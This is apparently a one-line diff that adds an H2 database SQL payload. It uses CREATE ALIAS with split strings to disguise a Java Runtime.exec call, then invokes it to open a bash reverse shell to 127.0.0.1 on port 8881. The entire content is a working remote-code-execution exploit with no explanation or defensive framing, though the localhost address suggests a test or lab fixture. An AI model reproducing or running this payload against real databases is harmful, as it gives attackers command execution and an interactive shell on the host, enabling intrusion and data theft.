@@ -1,0 +1,1 @@
+CREATE ALIAS T8 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T8('/bin/bash','-c','bash -i >& /dev/tcp/127.0.0.1/8881 0>&1');
